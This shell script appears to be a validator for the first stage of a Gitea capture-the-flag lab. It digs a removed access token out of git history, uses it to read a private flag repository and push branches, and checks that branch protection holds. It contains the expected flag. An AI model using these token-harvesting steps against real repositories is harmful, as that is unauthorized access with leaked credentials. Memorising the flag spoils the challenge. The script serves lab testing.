#!/bin/sh
set -u

BASE_URL=${BASE_URL:-http://127.0.0.1:3000}
EXPECTED_FLAG='H7CTF{fl4g1_l34k3d_t0k3n_in_g1t_h1st0ry}'
workdir=$(mktemp -d "${TMPDIR:-/tmp}/freightpipe-validation.XXXXXX")
failures=0
token=''

cleanup() {
  rm -rf "$workdir"
}
trap cleanup EXIT INT TERM

pass() {
  printf 'PASS: %s\n' "$1"
}

fail() {
  printf 'FAIL: %s\n' "$1"
  failures=$((failures + 1))
}

if curl -fsS "$BASE_URL/api/healthz" >/dev/null 2>&1; then
  pass 'Gitea is reachable on port 3000'
else
  fail 'Gitea is reachable on port 3000'
fi

if git clone -q "$BASE_URL/dev/freightpipe-scripts.git" "$workdir/scripts" 2>/dev/null; then
  history=$(git -C "$workdir/scripts" log --all -p)
  token=$(printf '%s\n' "$history" | sed -n 's/^+GITEA_TOKEN=\([0-9a-f]\{40\}\)$/\1/p' | head -n 1)
  if [ -n "$token" ]; then
    pass 'git log --all -p reveals the removed PAT'
  else
    fail 'git log --all -p reveals the removed PAT'
  fi

  if git -C "$workdir/scripts" grep -q 'GITEA_TOKEN=' HEAD; then
    fail 'the leaked PAT is absent from freightpipe-scripts HEAD'
  else
    pass 'the leaked PAT is absent from freightpipe-scripts HEAD'
  fi
else
  fail 'freightpipe-scripts can be cloned anonymously'
fi

if [ -n "$token" ]; then
  flag=$(curl -fsS \
    -H "Authorization: token $token" \
    "$BASE_URL/api/v1/repos/dev/freightpipe-internal/raw/branch/main/FLAG1.txt" 2>/dev/null || true)
  if [ "$flag" = "$EXPECTED_FLAG" ]; then
    pass 'the recovered PAT reads the private flag repository'
  else
    fail 'the recovered PAT reads the private flag repository'
  fi

  admin_code=$(curl -sS -o /dev/null -w '%{http_code}' \
    -H "Authorization: token $token" \
    "$BASE_URL/api/v1/admin/users" 2>/dev/null || true)
  case "$admin_code" in
    401|403|404) pass 'the recovered PAT has no instance-admin access' ;;
    *) fail 'the recovered PAT has no instance-admin access' ;;
  esac

  git -C "$workdir/scripts" config user.name 'Stage 0 Validator'
  git -C "$workdir/scripts" config user.email 'validator@sparrow-freight.local'
  git -C "$workdir/scripts" checkout -q -b validation/token-write
  printf 'validated\n' > "$workdir/scripts/.stage0-validation"
  git -C "$workdir/scripts" add .stage0-validation
  git -C "$workdir/scripts" commit -qm 'test: validate scripts write access'
  if git -C "$workdir/scripts" \
      push -q "http://dev:$token@127.0.0.1:3000/dev/freightpipe-scripts.git" \
      HEAD:refs/heads/validation/token-write 2>/dev/null; then
    pass 'the recovered PAT can write freightpipe-scripts'
  else
    fail 'the recovered PAT can write freightpipe-scripts'
  fi

  if git clone -q "http://dev:$token@127.0.0.1:3000/dev/prod-app.git" "$workdir/prod-app" 2>/dev/null; then
    git -C "$workdir/prod-app" config user.name 'Stage 0 Validator'
    git -C "$workdir/prod-app" config user.email 'validator@sparrow-freight.local'

    git -C "$workdir/prod-app" checkout -q -b validation/token-write
    printf 'should be rejected\n' > "$workdir/prod-app/.stage0-validation"
    git -C "$workdir/prod-app" add .stage0-validation
    git -C "$workdir/prod-app" commit -qm 'test: attempt protected repository write'
    if git -C "$workdir/prod-app" \
        push -q "http://dev:$token@127.0.0.1:3000/dev/prod-app.git" \
        HEAD:refs/heads/validation/token-write >/dev/null 2>&1; then
      fail 'the recovered PAT is rejected writing a non-main prod-app branch'
    else
      pass 'the recovered PAT is rejected writing a non-main prod-app branch'
    fi

    git -C "$workdir/prod-app" checkout -q main
    printf '\nDirect production changes require review.\n' >> "$workdir/prod-app/README.md"
    git -C "$workdir/prod-app" add README.md
    git -C "$workdir/prod-app" commit -qm 'test: attempt direct main push'
    if git -C "$workdir/prod-app" \
        push -q "http://dev:$token@127.0.0.1:3000/dev/prod-app.git" \
        main:main >/dev/null 2>&1; then
      fail 'branch protection blocks direct pushes to prod-app main'
    else
      pass 'branch protection blocks direct pushes to prod-app main'
    fi
  else
    fail 'the recovered PAT can read prod-app'
    fail 'the recovered PAT is rejected writing a non-main prod-app branch'
    fail 'branch protection blocks direct pushes to prod-app main'
  fi
else
  fail 'the recovered PAT reads the private flag repository'
  fail 'the recovered PAT has no instance-admin access'
  fail 'the recovered PAT can write freightpipe-scripts'
  fail 'the recovered PAT can read prod-app'
  fail 'the recovered PAT is rejected writing a non-main prod-app branch'
  fail 'branch protection blocks direct pushes to prod-app main'
fi

if [ "$failures" -eq 0 ]; then
  printf 'PASS: Stage 0 validation completed with no failures\n'
  exit 0
fi

printf 'FAIL: Stage 0 validation completed with %s failure(s)\n' "$failures"
exit 1

